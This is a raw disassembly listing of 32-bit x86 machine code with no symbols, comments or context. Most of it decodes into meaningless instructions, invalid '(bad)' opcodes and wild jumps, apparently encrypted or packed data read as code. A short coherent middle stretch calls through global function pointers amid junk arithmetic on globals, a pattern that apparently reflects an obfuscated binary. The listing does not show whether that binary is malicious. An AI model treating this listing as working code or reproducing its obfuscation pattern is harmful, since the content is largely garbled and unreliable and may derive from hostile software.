  41e661:	cmp    eax,0xab245314
  41e666:	push   edx
  41e667:	and    esp,DWORD PTR [ecx+0x711e0863]
  41e66d:	data16 mov WORD PTR [ebx-0x47],?
  41e671:	sub    BYTE PTR [ecx+0x7d6a2e6e],dh
  41e677:	mov    eax,0x15b3627f
  41e67c:	jo     0x41e6df
  41e67e:	mov    esi,0xfb5287c9
  41e683:	jg     0x41e609
  41e685:	mov    ebp,0xe2bd2ad4
  41e68a:	inc    ebp
  41e68b:	or     dh,BYTE PTR [ebp+0x3e]
  41e68e:	cwde   
  41e68f:	test   BYTE PTR [ebx-0x4b],ah
  41e692:	ret    0xb703
  41e695:	push   ebp
  41e696:	pop    ss
  41e697:	jmp    0x75b091f7
  41e69c:	pop    es
  41e69d:	push   0xffffffea
  41e69f:	jecxz  0x41e6f9
  41e6a1:	das    
  41e6a2:	ins    DWORD PTR es:[edi],dx
  41e6a3:	xchg   ecx,eax
  41e6a4:	aas    
  41e6a5:	pop    ebp
  41e6a6:	push   ss
  41e6a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e6a8:	(bad)  
  41e6a9:	or     edi,DWORD PTR [ecx-0x2]
  41e6ac:	mov    ebx,0x7bf76cb7
  41e6b1:	push   esi
  41e6b2:	or     dl,BYTE PTR [esi-0x35]
  41e6b5:	xchg   edx,eax
  41e6b6:	in     eax,dx
  41e6b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e6b8:	adc    bl,cl
  41e6ba:	jmp    0x59cb9ea7
  41e6bf:	sub    eax,0x3f8d2f58
  41e6c4:	mov    al,ds:0xa7ece458
  41e6c9:	adc    eax,0x34fce85c
  41e6ce:	inc    ebp
  41e6cf:	ret    
  41e6d0:	and    al,0x3b
  41e6d2:	in     eax,dx
  41e6d3:	in     al,0x33
  41e6d5:	jnp    0x41e6ae
  41e6d7:	or     al,BYTE PTR [esi+0x76]
  41e6da:	jle    0x41e716
  41e6dc:	xor    DWORD PTR [ebp+ebx*1+0x6b6bb7ec],ebx
  41e6e3:	dec    ecx
  41e6e4:	adc    eax,0xbecf9a28
  41e6e9:	xchg   edx,eax
  41e6ea:	mov    al,ds:0x482d34fe
  41e6ef:	xchg   esp,eax
  41e6f0:	into   
  41e6f1:	sar    DWORD PTR [ecx],0xfd
  41e6f4:	daa    
  41e6f5:	push   0x5
  41e6f7:	pop    edi
  41e6f8:	sbb    al,ah
  41e6fa:	out    0x58,al
  41e6fc:	sbb    eax,0xd925f806
  41e701:	inc    edi
  41e702:	inc    edx
  41e703:	sbb    eax,0x4241c08b
  41e708:	loope  0x41e764
  41e70a:	jge    0x41e6b3
  41e70c:	xchg   al,ch
  41e70e:	aas    
  41e70f:	or     al,0xf1
  41e711:	mov    BYTE PTR [ecx+0x6469daaa],bl
  41e717:	jecxz  0x41e749
  41e719:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e71a:	pop    edi
  41e71b:	cld    
  41e71c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e71d:	and    al,0xf1
  41e71f:	inc    eax
  41e720:	cwde   
  41e721:	dec    edi
  41e722:	popf   
  41e723:	dec    esp
  41e724:	out    dx,al
  41e725:	(bad)  
  41e727:	popw   es
  41e729:	jno    0x41e6b7
  41e72b:	(bad)  
  41e72c:	(bad)  [ecx]
  41e72e:	and    al,0x17
  41e730:	mov    ah,0xe0
  41e732:	jns    0x41e744
  41e734:	scas   al,BYTE PTR es:[edi]
  41e735:	sbb    ch,BYTE PTR [ebp+0x50]
  41e738:	cli    
  41e739:	mov    bl,0x6c
  41e73b:	arpl   dx,bp
  41e73d:	(bad)  
  41e73e:	int    0xf5
  41e740:	and    DWORD PTR [edi-0x58],0xffffffdd
  41e744:	bound  edx,QWORD PTR [edx]
  41e746:	cli    
  41e747:	mov    ah,0x5c
  41e749:	mov    dl,0x4d
  41e74b:	test   al,0xda
  41e74d:	test   BYTE PTR [edi],al
  41e74f:	(bad)  
  41e750:	inc    esp
  41e751:	iret   
  41e752:	das    
  41e753:	push   ds
  41e754:	xor    DWORD PTR ss:[ebp-0x66],edx
  41e758:	inc    ebp
  41e759:	sub    BYTE PTR [esi],ch
  41e75b:	int3   
  41e75c:	fwait
  41e75d:	pxor   mm5,QWORD PTR [esi-0x52]
  41e761:	int3   
  41e762:	loop   0x41e7e0
  41e764:	adc    DWORD PTR [ebx-0x1e],ecx
  41e767:	rcl    edx,1
  41e769:	dec    ebp
  41e76a:	call   0x2c591f8f
  41e76f:	sub    ah,al
  41e771:	arpl   si,si
  41e773:	shr    BYTE PTR [ebp+ebx*8+0x31b93287],0xf9
  41e77b:	out    0xd9,eax
  41e77d:	inc    ecx
  41e77e:	pop    eax
  41e77f:	or     ebx,edx
  41e781:	and    al,0xfd
  41e783:	mov    edi,0x6cd08beb
  41e788:	in     al,0x4
  41e78a:	fld    st(1)
  41e78c:	addr16 mov ebp,0xcbb74b1
  41e792:	fidiv  DWORD PTR [esi-0x149920a]
  41e798:	cmp    ch,BYTE PTR [edi]
  41e79a:	leave  
  41e79b:	fbstp  TBYTE PTR [ebx-0x3a]
  41e79e:	mov    ah,0x38
  41e7a0:	mov    eax,ds:0x6d9762fb
  41e7a5:	sub    DWORD PTR [eax-0x20621664],esp
  41e7ab:	sub    esi,DWORD PTR [ecx]
  41e7ad:	fld    TBYTE PTR [esi]
  41e7af:	dec    esp
  41e7b0:	dec    ebp
  41e7b1:	adc    ah,BYTE PTR [ebp-0x78]
  41e7b4:	cmp    bl,BYTE PTR [ebp+0x44]
  41e7b7:	jne    0x41e7fa
  41e7b9:	sti    
  41e7ba:	mov    cl,0x27
  41e7bc:	sahf   
  41e7bd:	ret    0xbcca
  41e7c0:	mov    bh,0x55
  41e7c2:	test   bl,bh
  41e7c4:	cld    
  41e7c5:	cld    
  41e7c6:	sbb    al,0x76
  41e7c8:	jmp    0x41e7bc
  41e7ca:	das    
  41e7cb:	xchg   edx,eax
  41e7cc:	gs pop ecx
  41e7ce:	clc    
  41e7cf:	push   ebp
  41e7d0:	out    0x26,eax
  41e7d2:	push   edi
  41e7d3:	gs mov bh,0x34
  41e7d6:	std    
  41e7d7:	xchg   esp,eax
  41e7d8:	ss int3 
  41e7da:	inc    ecx
  41e7db:	cli    
  41e7dc:	inc    edi
  41e7dd:	aaa    
  41e7de:	and    eax,0xc08c1950
  41e7e3:	add    al,0x1d
  41e7e5:	pop    esi
  41e7e6:	mov    cl,0x7d
  41e7e8:	cmp    BYTE PTR [edi+0xb],al
  41e7eb:	push   esi
  41e7ec:	or     al,0xc
  41e7ee:	mov    dl,0x5e
  41e7f0:	pop    esp
  41e7f1:	sbb    al,BYTE PTR [edi+0x24]
  41e7f4:	mov    dl,0x22
  41e7f6:	pop    es
  41e7f7:	pop    esp
  41e7f8:	mov    edi,0xc4d67776
  41e7fd:	fidivr WORD PTR [edi-0x61c0e0ea]
  41e803:	adc    DWORD PTR [ebp+0x3b420c63],edi
  41e809:	nop
  41e80a:	ja     0x41e7f3
  41e80c:	js     0x41e840
  41e80e:	inc    ebx
  41e80f:	outs   dx,BYTE PTR ds:[esi]
  41e810:	(bad)  
  41e811:	inc    ebp
  41e812:	dec    ecx
  41e813:	aam    0xb8
  41e815:	scas   al,BYTE PTR es:[edi]
  41e816:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e817:	lods   al,BYTE PTR ds:[esi]
  41e818:	and    dh,dl
  41e81a:	nop
  41e81b:	push   cs
  41e81c:	add    al,0x1b
  41e81e:	loop   0x41e88d
  41e820:	xor    edx,edx
  41e822:	xor    eax,DWORD PTR [ebx]
  41e824:	scas   al,BYTE PTR es:[edi]
  41e825:	and    al,0xc2
  41e827:	jne    0x41e80f
  41e829:	xlat   BYTE PTR ds:[ebx]
  41e82a:	cmp    al,0x73
  41e82c:	rcl    BYTE PTR [eax+eiz*2],0xc7
  41e830:	mov    eax,0x16fd9a2a
  41e835:	inc    ecx
  41e836:	xor    DWORD PTR [ebp+0x4566cd9c],edi
  41e83c:	inc    ebx
  41e83d:	sub    eax,0xa5f91118
  41e842:	arpl   WORD PTR [esi+0x5a],dx
  41e845:	sbb    DWORD PTR [edx+edx*4+0x3],esi
  41e849:	and    ah,BYTE PTR [esi]
  41e84b:	pushf  
  41e84c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e84d:	outs   dx,DWORD PTR ds:[esi]
  41e84e:	add    dl,al
  41e850:	bound  edx,QWORD PTR [ebp-0x43]
  41e853:	pop    ebx
  41e854:	mov    BYTE PTR [ebx],bh
  41e856:	aad    0xba
  41e858:	fdivr  DWORD PTR [ebx]
  41e85a:	pop    es
  41e85b:	pop    esi
  41e85c:	das    
  41e85d:	push   ds
  41e85e:	jmp    0x53a7:0x301bdd56
  41e865:	add    BYTE PTR gs:[ebp+esi*1+0x3b],bl
  41e86a:	jmp    0x5fa8ce64
  41e86f:	clc    
  41e870:	pop    esi
  41e871:	stc    
  41e872:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e873:	fs call 0x7dc05d88
  41e879:	push   edx
  41e87a:	test   al,0x6c
  41e87c:	arpl   WORD PTR [ecx],dx
  41e87e:	cmp    BYTE PTR [ebx-0x52],bl
  41e881:	jg     0x41e8c6
  41e883:	pop    edi
  41e884:	data16 and al,0x0
  41e887:	ss sbb edx,ebp
  41e88a:	aas    
  41e88b:	jo     0x41e8a7
  41e88d:	lock test eax,0x7c3742ce
  41e893:	and    bh,BYTE PTR [esi-0x2371353]
  41e899:	icebp  
  41e89a:	mov    ch,0x38
  41e89c:	xchg   edi,eax
  41e89d:	xor    bl,BYTE PTR [ebx]
  41e89f:	in     al,dx
  41e8a0:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41e8a2:	ss mov dl,0xc3
  41e8a5:	fwait
  41e8a6:	add    BYTE PTR [ecx-0x6b1e883a],0x2a
  41e8ad:	mov    ds:0x1ae77bb,eax
  41e8b2:	scas   al,BYTE PTR es:[edi]
  41e8b3:	cld    
  41e8b4:	aam    0x5c
  41e8b6:	gs (bad) 
  41e8b8:	sub    eax,0x39317ff2
  41e8bd:	ins    DWORD PTR es:[edi],dx
  41e8be:	in     al,0x80
  41e8c0:	mov    ecx,0x3f83b45f
  41e8c5:	dec    esi
  41e8c6:	nop
  41e8c7:	nop
  41e8c8:	cdq    
  41e8c9:	adc    al,0xa2
  41e8cb:	adc    eax,0xa4539df6
  41e8d0:	sbb    BYTE PTR [eax-0x1c6ab7e6],0xd
  41e8d7:	push   cs
  41e8d8:	cli    
  41e8d9:	push   cs
  41e8da:	push   esi
  41e8db:	fdiv   QWORD PTR [edx+0x7042eaa4]
  41e8e1:	mov    bh,0x7a
  41e8e3:	into   
  41e8e4:	mov    WORD PTR ds:0x57075bd0,es
  41e8ea:	push   esi
  41e8eb:	leave  
  41e8ec:	push   edi
  41e8ed:	inc    edi
  41e8ee:	imul   ecx,DWORD PTR [esi+ecx*8],0xffffffe0
  41e8f2:	add    al,BYTE PTR [esi+0x10111043]
  41e8f8:	test   DWORD PTR [esi+0x72],eax
  41e8fb:	dec    ebp
  41e8fc:	pop    eax
  41e8fd:	mov    edi,0x182f333a
  41e902:	ja     0x41e893
  41e904:	xchg   ebx,eax
  41e905:	pop    ss
  41e906:	outs   dx,BYTE PTR ds:[esi]
  41e907:	aad    0xc7
  41e909:	fisub  DWORD PTR ds:0x888fc272
  41e90f:	test   eax,0xbdd17147
  41e914:	pop    ds
  41e915:	adc    eax,0x10f1ecb1
  41e91a:	mov    ah,cl
  41e91c:	(bad)  
  41e91d:	dec    ecx
  41e91e:	in     eax,dx
  41e91f:	int    0xe2
  41e921:	lea    ecx,[ebp-0x21]
  41e924:	mov    WORD PTR [edx],fs
  41e926:	hlt    
  41e927:	jl     0x41e929
  41e929:	rcl    ecx,0xb2
  41e92c:	xor    DWORD PTR [eax+0x46],eax
  41e92f:	xchg   ecx,eax
  41e930:	cld    
  41e931:	cdq    
  41e932:	jo     0x41e8e9
  41e934:	int3   
  41e935:	adc    al,0x53
  41e937:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e938:	rol    ah,0xc6
  41e93b:	mov    eax,0xecee7fc2
  41e940:	call   0x5eb155d1
  41e945:	js     0x41e8dc
  41e947:	repnz and edx,DWORD PTR [ebp+0x1e0331ab]
  41e94e:	shl    BYTE PTR [ebp-0x14],0xa2
  41e952:	retf   
  41e953:	push   edx
  41e954:	test   eax,0x57587685
  41e959:	jecxz  0x41e956
  41e95b:	rcr    DWORD PTR [ebx],cl
  41e95d:	xchg   esp,eax
  41e95e:	nop
  41e95f:	cld    
  41e960:	lahf   
  41e961:	ins    BYTE PTR es:[edi],dx
  41e962:	inc    esi
  41e964:	mov    eax,ds:0x8b5c389b
  41e969:	mov    dl,0xdd
  41e96b:	push   0xffffffe2
  41e96d:	inc    ebp
  41e96e:	pusha  
  41e96f:	jg     0x41e9d4
  41e971:	aad    0x7
  41e973:	add    BYTE PTR [edi+ebx*4],dl
  41e976:	mov    edx,0x46a27ba5
  41e97b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e97c:	jg     0x41e917
  41e97e:	scas   eax,DWORD PTR es:[edi]
  41e97f:	inc    esi
  41e980:	sub    dh,BYTE PTR [edx]
  41e982:	fwait
  41e983:	or     edx,edi
  41e985:	mov    ecx,edx
  41e987:	mov    edx,DWORD PTR [esp+0x18]
  41e98b:	xor    eax,ebx
  41e98d:	xor    ecx,esi
  41e98f:	mov    esi,DWORD PTR [esp+0x1c]
  41e993:	cmp    edx,eax
  41e995:	jne    0x41e9a3
  41e99b:	cmp    esi,ecx
  41e99d:	je     0x41e9ea
  41e9a3:	push   DWORD PTR ds:0x422648
  41e9a9:	push   DWORD PTR ds:0x4223dc
  41e9af:	mov    eax,ds:0x422558
  41e9b4:	mov    eax,DWORD PTR [eax+0x1a4]
  41e9ba:	push   DWORD PTR [eax]
  41e9bc:	mov    eax,DWORD PTR [esp+0x78]
  41e9c0:	call   eax
  41e9c2:	mov    ecx,DWORD PTR ds:0x422558
  41e9c8:	mov    ecx,DWORD PTR [ecx+0x1dc]
  41e9ce:	mov    DWORD PTR [ecx],eax
  41e9d0:	mov    eax,ds:0x422558
  41e9d5:	push   0x4
  41e9d7:	add    eax,0x1dc
  41e9dc:	push   eax
  41e9dd:	lea    eax,[esp+0x84]
  41e9e4:	push   eax
  41e9e5:	call   0x415231
  41e9ea:	mov    eax,DWORD PTR [esp+0x7c]
  41e9ee:	mov    eax,DWORD PTR [eax]
  41e9f0:	pop    edi
  41e9f1:	pop    esi
  41e9f2:	pop    ebx
  41e9f3:	mov    esp,ebp
  41e9f5:	pop    ebp
  41e9f6:	ret    0xc
  41e9f9:	push   ebp
  41e9fa:	mov    ebp,esp
  41e9fc:	sub    esp,0x23c
  41ea02:	or     ecx,eax
  41ea04:	push   ebx
  41ea05:	cmp    DWORD PTR ds:0x428267,0x0
  41ea0c:	mov    DWORD PTR ds:0x428373,0x7749
  41ea16:	mov    DWORD PTR ds:0x428173,ebx
  41ea1c:	mov    DWORD PTR ds:0x428313,edx
  41ea22:	mov    DWORD PTR ds:0x428313,0xc7b
  41ea2c:	jmp    0x41ea8e
  41ea31:	mov    DWORD PTR ds:0x42828b,edx
  41ea37:	cmp    DWORD PTR ds:0x428267,0x0
  41ea3e:	jg     0x41ea74
  41ea44:	push   0x2154
  41ea49:	push   0x5063
  41ea4e:	call   DWORD PTR ds:0x428e14
  41ea54:	sbb    DWORD PTR ds:0x42836f,ecx
  41ea5a:	mov    ecx,DWORD PTR ds:0x42831b
  41ea60:	xor    ecx,DWORD PTR ds:0x428307
  41ea66:	mov    DWORD PTR ds:0x42831b,ecx
  41ea6c:	sbb    ecx,0x6e15
  41ea72:	neg    ecx
  41ea74:	xor    DWORD PTR ds:0x428243,ecx
  41ea7a:	adc    ecx,DWORD PTR ds:0x428197
  41ea80:	mov    ecx,DWORD PTR ds:0x4281e3
  41ea86:	mov    ecx,DWORD PTR [ecx]
  41ea88:	and    DWORD PTR ds:0x428187,ecx
  41ea8e:	push   esi
  41ea8f:	mov    ecx,DWORD PTR ds:0x4281f7
  41ea95:	mov    eax,ds:0x4282e3
  41ea9a:	sub    eax,ecx
  41ea9c:	imul   ecx,DWORD PTR [ecx+eax*1]
  41eaa0:	push   edi
  41eaa1:	add    DWORD PTR ds:0x42825b,ebx
  41eaa7:	mov    DWORD PTR [ebp-0x50],0x1
  41eaae:	sub    DWORD PTR ds:0x42828b,edi
  41eab4:	mov    DWORD PTR [ebp-0xbc],0x61a1
  41eabe:	xor    DWORD PTR ds:0x42831b,0x437e
  41eac8:	mov    DWORD PTR [ebp-0xb8],0x1
  41ead2:	mov    ecx,DWORD PTR [ebp-0xb8]
  41ead8:	add    eax,0x2e28
  41eadd:	mov    eax,0x584
  41eae2:	xor    edx,edx
  41eae4:	sbb    DWORD PTR ds:0x428397,0x4282ef
  41eaee:	div    ecx
  41eaf0:	xor    ecx,0x2352
  41eaf6:	imul   eax,eax,0x51d4
  41eafc:	neg    ecx
  41eafe:	mov    ecx,DWORD PTR [ebp-0xbc]
  41eb04:	or     DWORD PTR ds:0x428383,0x428393
  41eb0e:	xor    eax,ecx
  41eb10:	and    eax,0x4c09
  41eb15:	xor    ecx,DWORD PTR ds:0x428303
  41eb1b:	mov    ecx,DWORD PTR [ebp-0x50]
  41eb1e:	xor    edx,edx
  41eb20:	and    DWORD PTR ds:0x42825b,0x42818f
  41eb2a:	div    ecx
  41eb2c:	or     DWORD PTR ds:0x4283a7,0x3423
  41eb36:	sub    eax,0x401
  41eb3b:	cmp    DWORD PTR ds:0x428327,0x0
  41eb42:	mov    DWORD PTR ds:0x428397,edx
  41eb48:	mov    DWORD PTR ds:0x428237,ebx
  41eb4e:	not    DWORD PTR ds:0x428233
  41eb54:	jmp    0x41ebb2
  41eb59:	mov    DWORD PTR ds:0x42822b,0x3ca0
  41eb63:	not    DWORD PTR ds:0x428317
  41eb69:	cmp    DWORD PTR ds:0x428327,0x0
  41eb70:	je     0x41eba0
  41eb76:	push   DWORD PTR [ebp-0x10]
  41eb79:	push   0x4da1
  41eb7e:	push   0x1144
  41eb83:	push   DWORD PTR [ebp-0x18]
  41eb86:	call   DWORD PTR ds:0x428e18
  41eb8c:	add    edx,0x1800
  41eb92:	add    edx,DWORD PTR ds:0x42838f
  41eb98:	sub    ecx,ecx
  41eb9a:	adc    ecx,0x47f1
  41eba0:	sub    edx,edx
  41eba2:	mov    DWORD PTR ds:0x428397,0x44a4
  41ebac:	and    ecx,DWORD PTR ds:0x42822f
  41ebb2:	mov    DWORD PTR [ebp-0x90],eax
  41ebb8:	mov    eax,ds:0x4282c3
  41ebbd:	mov    eax,DWORD PTR [eax]
  41ebbf:	sbb    DWORD PTR ds:0x428393,eax
  41ebc5:	mov    DWORD PTR [ebp-0x8c],0x2ff8
  41ebcf:	add    DWORD PTR ds:0x42815b,0x4282a7
  41ebd9:	mov    DWORD PTR [ebp-0x4c],0x39f7
  41ebe0:	xor    DWORD PTR ds:0x42824f,edx
  41ebe6:	mov    DWORD PTR [ebp-0xb4],0x3842
  41ebf0:	or     edx,ecx
  41ebf2:	jmp    0x41ef4e
  41ebf7:	ret    0x8bf6
  41ebfa:	push   ebx
  41ebfb:	sbb    ch,BYTE PTR [ebx]
  41ebfd:	mov    edx,0x71125f66
  41ec02:	mov    al,0x1d
  41ec04:	add    eax,DWORD PTR [edi+0x6a]
  41ec07:	push   cs
  41ec08:	das    
  41ec09:	push   ss
  41ec0a:	sbb    BYTE PTR [ebx+0x6f181812],ah
  41ec10:	mov    dl,0xd8
  41ec12:	es pop esp
  41ec14:	mov    ds:0x43bd162e,eax
  41ec19:	mov    esp,0x66c128fa
  41ec1e:	in     eax,0x6c
  41ec20:	test   DWORD PTR [esi-0x6d],esp
  41ec23:	cdq    
  41ec24:	cdq    
  41ec25:	mov    edx,edx
  41ec27:	mov    al,ds:0x5ec99066
  41ec2c:	cmc    
  41ec2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec2e:	jo     0x41ec91
  41ec30:	shl    DWORD PTR [edi],cl
  41ec32:	(bad)  [edx+edx*1+0x69]
  41ec36:	(bad)  
  41ec37:	xor    BYTE PTR [edx+edx*1-0x1c6c031f],al
  41ec3e:	call   0x25943f83
  41ec43:	(bad)  
  41ec44:	in     eax,dx
  41ec45:	and    BYTE PTR [ebx],al
  41ec47:	iret   
  41ec48:	adc    al,0x84
  41ec4a:	push   esi
  41ec4b:	in     al,dx
  41ec4c:	sbb    edx,DWORD PTR ds:0x5bf95982
  41ec52:	or     eax,0x4aacbbdf
  41ec57:	sub    DWORD PTR [ebx],ebx
  41ec59:	or     BYTE PTR [edi],al
  41ec5b:	xor    BYTE PTR [ebp+0x3ca7af4c],dh
  41ec61:	push   ss
  41ec62:	outs   dx,DWORD PTR ds:[esi]
  41ec63:	fcmovnu st,st(4)
  41ec65:	xchg   esi,eax
  41ec66:	sub    esi,DWORD PTR ds:[eax]
  41ec69:	inc    edi
  41ec6a:	cli    
  41ec6b:	jne    0x41ecd3
  41ec6d:	(bad)  
  41ec6e:	and    DWORD PTR [eax-0x4e],0xffffff81
  41ec72:	jb     0x41ecc3
  41ec74:	inc    ebp
  41ec75:	pop    ss
  41ec76:	lea    ebp,[esi+0x4aa3ae7e]
  41ec7c:	sbb    cl,BYTE PTR [esi+0x2a]
  41ec7f:	loop   0x41ec6c
  41ec81:	std    
  41ec82:	or     dh,BYTE PTR [ebx-0x35]
  41ec85:	int3   
  41ec86:	shr    BYTE PTR [edx],1
  41ec88:	push   es
  41ec89:	sbb    eax,0x571f949b
  41ec8e:	push   ds
  41ec8f:	out    dx,al
  41ec90:	es pop ebp
  41ec92:	stos   DWORD PTR es:[edi],eax
  41ec93:	idiv   DWORD PTR [eax]
  41ec95:	stos   DWORD PTR es:[edi],eax
  41ec96:	icebp  
  41ec97:	jb     0x41ec9b
  41ec99:	ins    BYTE PTR es:[edi],dx
  41ec9a:	cmp    BYTE PTR [ecx],cl
  41ec9c:	xor    al,0xd7
  41ec9e:	and    al,0xf5
  41eca0:	push   sp
  41eca2:	mov    al,0x61
  41eca4:	or     BYTE PTR [edi-0x160f23d1],dl
  41ecaa:	inc    ecx
  41ecab:	ins    DWORD PTR es:[edi],dx
  41ecac:	add    DWORD PTR ds:0x66dbc326,eax
  41ecb2:	dec    ebp
  41ecb3:	lods   al,BYTE PTR ds:[esi]
  41ecb4:	add    al,0x42
  41ecb6:	test   DWORD PTR [edx+0x61],edi
  41ecb9:	adc    eax,0x4619fb42
  41ecbe:	fld    QWORD PTR [edx+0x462c9496]
  41ecc4:	sbb    DWORD PTR [ecx+0x3f],esp
  41ecc7:	cmp    al,bh
  41ecc9:	or     DWORD PTR [esi-0x62],ecx
  41eccc:	xor    al,0xe2
  41ecce:	pop    es
  41eccf:	inc    ebx
  41ecd0:	retf   0x91c3
  41ecd3:	and    eax,0x7f21dbb8
  41ecd8:	ins    DWORD PTR es:[edi],dx
  41ecd9:	push   es
  41ecda:	rcl    DWORD PTR [ecx+ebx*1-0x3c],0x4c
  41ecdf:	and    DWORD PTR [ebp+0x6e6ef517],edx
  41ece5:	int    0x6e
  41ece7:	xchg   BYTE PTR [esi],bh
  41ece9:	dec    edx
  41ecea:	sbb    al,0x92
  41ecec:	push   edx
  41eced:	inc    edi
  41ecee:	sahf   
  41ecef:	pop    eax
  41ecf0:	les    edx,FWORD PTR [esi+0x5c2878a2]
  41ecf6:	lods   eax,DWORD PTR ds:[esi]
  41ecf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ecf8:	or     eax,0xe653a7bf
  41ecfd:	jns    0x41ec8c
  41ecff:	xor    cl,cl
  41ed01:	sbb    edi,DWORD PTR [esi]
  41ed03:	ja     0x41ed64
  41ed05:	xchg   ecx,eax
  41ed06:	cmp    edx,DWORD PTR [esi]
  41ed08:	pusha  
  41ed09:	mov    ds:0xe363956c,eax
  41ed0e:	out    dx,al
  41ed0f:	or     eax,0x1a36ed2b
  41ed14:	and    DWORD PTR [edx],ebx
  41ed16:	out    0x20,eax
  41ed18:	dec    esi
  41ed19:	scas   eax,DWORD PTR es:[edi]
  41ed1a:	es ss pop ds
  41ed1d:	jecxz  0x41ed2e
  41ed1f:	jge    0x41ed03
  41ed21:	and    eax,0x5abada54
  41ed26:	or     cl,BYTE PTR [esi-0x3954e34c]
  41ed2c:	cmp    bh,BYTE PTR ds:0x89bbf18c
  41ed32:	dec    ecx
  41ed33:	mov    ah,0x43
  41ed35:	inc    edi
  41ed36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed37:	mov    edx,0xa1dbbb5
  41ed3c:	clc    
  41ed3d:	mov    eax,ds:0xb306a2d
  41ed42:	inc    dx
  41ed44:	sub    BYTE PTR [edi+0x5883a244],ch
  41ed4a:	sbb    BYTE PTR [ecx-0x1ea096ae],ah
  41ed50:	imul   DWORD PTR [ecx]
  41ed52:	mov    esi,0x80647a6e
  41ed57:	push   0x9208d8d3
  41ed5c:	mov    dl,0xb5
  41ed5e:	aas    
  41ed5f:	sbb    BYTE PTR [ebp-0x4796a406],dl
  41ed65:	(bad)  
  41ed66:	outs   dx,DWORD PTR ds:[esi]
  41ed67:	xor    DWORD PTR [edx-0x251a054d],ecx
  41ed6d:	lock dec DWORD PTR [ebx]
  41ed70:	je     0x41eddd
  41ed72:	inc    edx
  41ed73:	clc    
  41ed74:	out    0x81,al
  41ed76:	pop    eax
  41ed78:	in     al,dx
  41ed79:	in     al,dx
  41ed7a:	(bad)  
  41ed7b:	pop    ss
  41ed7c:	sbb    DWORD PTR [edx],edx
  41ed7e:	fldcw  WORD PTR [edx]
  41ed80:	retf   0xfa59
  41ed83:	push   ecx
  41ed84:	aaa    
  41ed85:	push   ecx
  41ed86:	retf   0x1cee
  41ed89:	enter  0x7916,0xa2
  41ed8d:	push   ss
  41ed8e:	out    dx,eax
  41ed8f:	mov    WORD PTR [ebp+esi*8-0x22e134de],fs
  41ed96:	not    esp
  41ed98:	mov    ebx,0x1d64da1f
  41ed9d:	push   0xfffffffb
  41ed9f:	into   
  41eda0:	nop
  41eda1:	mov    DWORD PTR [esi-0x53],edi
  41eda4:	cmp    edi,DWORD PTR [edx-0x28114e9d]
  41edaa:	rcl    DWORD PTR [esp+edi*1],cl
  41edad:	push   ss
  41edae:	sbb    DWORD PTR [ebp+ebp*4+0x61475d1d],edi
  41edb5:	sub    cl,0x0
  41edb8:	xchg   ebx,eax
  41edb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41edba:	push   ecx
  41edbb:	sbb    esp,DWORD PTR [esi+0x5c3bd55d]
  41edc1:	(bad)  
  41edc2:	out    dx,al
  41edc3:	das    
  41edc4:	xor    eax,0xf9229571
  41edc9:	sti    
  41edca:	push   ds
  41edcb:	mov    ch,bl
  41edcd:	xchg   ecx,eax
  41edce:	sbb    dh,BYTE PTR [esi+0x4d]
  41edd1:	add    esp,DWORD PTR [ecx+ecx*2]
  41edd4:	xor    eax,0x34805bd5
  41edd9:	pusha  
  41edda:	inc    esp
  41eddb:	jb     0x41ee55
  41eddd:	pop    eax
  41edde:	test   DWORD PTR [ecx+0x7d1167f9],0xb1712168
  41ede8:	sub    al,0x9f
  41edea:	jp     0x41ee3e
  41edec:	fcmove st,st(1)
  41edee:	inc    edx
  41edef:	pop    esp
  41edf0:	(bad)  
  41edf1:	fs pop ebp
  41edf3:	(bad)  
  41edf4:	and    eax,0xbdd43540
  41edf9:	jnp    0x41ee4f
  41edfb:	and    eax,0x3aa2d56
  41ee00:	sbb    eax,DWORD PTR [esi-0x64]
  41ee03:	rcl    DWORD PTR [esi],cl
  41ee05:	ret    0x999e
  41ee08:	cmc    
  41ee09:	pop    DWORD PTR [ebp-0x6c]
  41ee0c:	cmovo  edi,esp
  41ee0f:	sar    BYTE PTR [edx-0x2b],0xdb
  41ee13:	int    0xf6
  41ee15:	sbb    BYTE PTR [ebx],0x79
  41ee18:	ror    DWORD PTR [ebp-0x7f],cl
  41ee1b:	imul   esi,DWORD PTR [ebx+0x19],0x4d
  41ee1f:	ret    
  41ee20:	enter  0xf714,0xeb
  41ee24:	ds in  eax,dx
  41ee26:	into   
  41ee27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee28:	sbb    edi,DWORD PTR [ecx]
  41ee2a:	lods   al,BYTE PTR ds:[esi]
  41ee2b:	retf   
  41ee2c:	cdq    
  41ee2d:	jp     0x41eddd
  41ee2f:	dec    esp
  41ee30:	loope  0x41ee6d
  41ee32:	js     0x41ee49
  41ee34:	and    al,0x50
  41ee36:	xor    dl,BYTE PTR [esi]
  41ee38:	pop    es
  41ee39:	repnz (bad) 
  41ee3b:	inc    ecx
  41ee3c:	dec    eax
  41ee3d:	or     edi,DWORD PTR [edx+0x61027707]
  41ee43:	fiadd  DWORD PTR [ebp-0x80]
  41ee46:	mov    eax,ds:0xdaf39e2d
  41ee4b:	shr    BYTE PTR [ecx-0x43f594f3],1
  41ee51:	and    DWORD PTR [edx+ebx*8],edi
  41ee54:	pop    ebp
  41ee55:	lds    eax,FWORD PTR [ecx+0x4058cec]
  41ee5b:	adc    dl,BYTE PTR [esi-0xb]
  41ee5e:	(bad)  
  41ee5f:	fsub   QWORD PTR [ecx]
  41ee61:	sbb    esi,DWORD PTR ds:0x41836e7c
  41ee67:	dec    edi
  41ee68:	sub    ebx,esp
  41ee6a:	push   eax
  41ee6b:	sahf   
  41ee6c:	add    ebp,DWORD PTR [esi-0x2f]
  41ee6f:	lods   eax,DWORD PTR ds:[esi]
  41ee70:	int    0xb8
